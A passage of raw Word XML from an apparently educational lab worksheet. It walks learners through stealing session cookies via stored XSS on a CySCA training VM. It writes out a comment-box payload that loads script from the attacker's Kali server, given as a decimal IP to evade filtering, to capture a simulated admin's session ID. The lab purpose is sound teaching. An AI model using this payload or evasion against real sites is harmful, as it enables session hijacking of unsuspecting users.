          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">This writes the </w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="00CC0F44" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (actually jQuery)</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> into a file which we can call. It means "send cookie=&lt;your cookie&gt; to the web server at Kali". </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CC5883" w14:textId="77777777" w:rsidR="00C97604" w:rsidRPr="00FA4E5F" w:rsidRDefault="00C97604" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Now we need a web server</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> on Kali so that we can receive Cookies from the CYSCA web server</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> through the JavaScript created above.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516C5ADA" w14:textId="77777777" w:rsidR="008F2E27" w:rsidRPr="00FA4E5F" w:rsidRDefault="008F2E27" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">NOTE: </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>If you type the dotted IPV4 address in directly to the blog post you will break it, writing the broken link to the bold and italics instructions. The way to fix this is to shutdown and restart the CySCAInABox VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E63F0D" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRDefault="00AF1AF4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>On Kali Terminal, enter command</w:t>
      </w:r>
      <w:r w:rsidR="00C97604" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500DB81A" w14:textId="77777777" w:rsidR="004254B1" w:rsidRPr="004254B1" w:rsidRDefault="004254B1" w:rsidP="004254B1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1440"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004254B1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>sudo su -   This is to login as root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395CAA3E" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="002354C7" w:rsidP="004254B1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="-625"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:r w:rsidR="00C97604" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidR="004254B1">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00C97604" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> –m SimpleHTTPServer 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FBDC79" w14:textId="77777777" w:rsidR="002354C7" w:rsidRPr="00FA4E5F" w:rsidRDefault="002354C7" w:rsidP="004254B1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1440"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>and type in the password</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>Kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0345E088" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRPr="00FA4E5F" w:rsidRDefault="002354C7" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">We need to remove the </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> from</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> our XSS exploit that we want to enter in the Comment box</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>. Using the host PC</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (You Windows 10/11)</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>, open a web browser and find an IP to Decimal convertor, and convert</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kali’s IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>100.200</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> to decimal.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC37B54" w14:textId="77777777" w:rsidR="00F67E82" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F67E82" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Note: Can use - https://www.browserling.com/tools/ip-to-dec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285F08A8" w14:textId="77777777" w:rsidR="001279DD" w:rsidRPr="00FA4E5F" w:rsidRDefault="002354C7" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>The decimal version is:</w:t>
      </w:r>
      <w:r w:rsidR="007B1741" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (YOUR KALI IP)</w:t>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DBD5EB" w14:textId="77777777" w:rsidR="002354C7" w:rsidRPr="00FA4E5F" w:rsidRDefault="008F2E27" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="3C763D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="DFF0D8"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Example of a Kali </w:t>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="3C763D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="DFF0D8"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>IP address 192.168.68.68 is equal to </w:t>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="3C763D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>3232252996</w:t>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="3C763D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="DFF0D8"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAA7DBF" w14:textId="77777777" w:rsidR="002354C7" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="73CF5F5F">
          <v:rect id="_x0000_s2105" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:11.45pt;width:446.25pt;height:41.9pt;z-index:9">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="2632273A" w14:textId="7929BD75" w:rsidR="002354C7" w:rsidRPr="002354C7" w:rsidRDefault="001C35C4" w:rsidP="002354C7">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="001C35C4">
                    <w:rPr>
                      <w:rStyle w:val="value"/>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                    </w:rPr>
                    <w:t>3232261221</w:t>
                  </w:r>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A6FF5F" w14:textId="77777777" w:rsidR="00C97604" w:rsidRPr="00FA4E5F" w:rsidRDefault="002354C7" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>In the comment field of the web site (</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Kali’s</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B23F43" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is still browsing the Blog page</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>), type</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the comment box:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189FCA70" w14:textId="77777777" w:rsidR="002354C7" w:rsidRPr="00FA4E5F" w:rsidRDefault="00283360" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284" w:right="-625"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>[&lt;script src=//</w:t>
      </w:r>
      <w:r w:rsidR="00FF27E3" w:rsidRPr="00FF27E3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="3C763D"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>3232261221</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>/.j&gt;](test5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4525E5E2" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AF1AF4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Observe the interaction between Kali &amp; CYSCA Web Server (Once XSS script is submitted via the Comment box). </w:t>
      </w:r>
      <w:r w:rsidR="00683F22" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Swap across (Alt + Tab) to the </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Kali Terminal</w:t>
      </w:r>
      <w:r w:rsidR="00683F22" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> and you should see the session ID (your own). </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Refer below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F0D59C" w14:textId="77777777" w:rsidR="00C61F35" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="2DDC8536">
          <v:shape id="_x0000_i1044" type="#_x0000_t75" style="width:415.75pt;height:233.5pt;visibility:visible">
            <v:imagedata r:id="rId27" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="073F9898" w14:textId="77777777" w:rsidR="00683F22" w:rsidRPr="00FA4E5F" w:rsidRDefault="00683F22" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Wait a bit and see if another visitor to the site (the admin) goes there too.</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is just an auto simulated browsing behaviour prepared on CYSCA web server.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCDA74F" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="758AB239">
          <v:rect id="_x0000_s2104" style="position:absolute;left:0;text-align:left;margin-left:15pt;margin-top:30.9pt;width:408pt;height:41.9pt;z-index:8">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="3F6017B3" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00AF1AF4" w:rsidRDefault="00E816EC" w:rsidP="00AF1AF4">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="0"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="C00000"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00E816EC" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work?</w:t>
      </w:r>
      <w:r w:rsidR="0048371D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> What is Sycamore's session ID?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45983BFE" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB5680" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
